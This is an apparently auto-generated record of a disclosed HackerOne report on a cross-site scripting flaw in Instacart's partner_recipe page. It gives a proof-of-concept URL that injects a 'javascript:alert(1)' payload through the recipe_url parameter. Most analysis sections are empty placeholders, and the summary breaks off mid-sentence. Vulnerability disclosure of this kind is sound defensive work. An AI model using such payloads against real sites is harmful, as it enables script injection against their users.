# XSS in instacart.com/store/partner_recipe

## Metadata
- **Source:** HackerOne
- **Report:** 196221 | https://hackerone.com/reports/196221
- **Submitted:** 2017-01-06
- **Reporter:** karel_origin
- **Program:** Unknown
- **Bounty:** $100
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Please open the following url
```
https://www.instacart.com/store/partner_recipe?recipe_url=javascript:alert(1)&partner_name=&ingredients%5B%5D=apples&ingredients%5B%5D=butter&ingredients%5B%5D=Splenda+Brown+Sugar+Blend&ingredients%5B%5D=cinnamon&ingredients%5B%5D=nutmeg&title=Barb%27s+Fried+Apples+-Diabetic-Low+Fat&description=&image_url=%2Fassets%2Fimg%2Fno-recipe-image.jpg
```

and click on the

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Please open the following url
```
https://www.instacart.com/store/partner_recipe?recipe_url=javascript:alert(1)&partner_name=&ingredients%5B%5D=apples&ingredients%5B%5D=butter&ingredients%5B%5D=Splenda+Brown+Sugar+Blend&ingredients%5B%5D=cinnamon&ingredients%5B%5D=nutmeg&title=Barb%27s+Fried+Apples+-Diabetic-Low+Fat&description=&image_url=%2Fassets%2Fimg%2Fno-recipe-image.jpg
```

and click on the "Barb's Fried Apples -Diabetic-Low Fat" image to trigger the payload.

The affected parameter is
recipe_url


</details>

---
*Analysed by Claude on 2026-05-24*
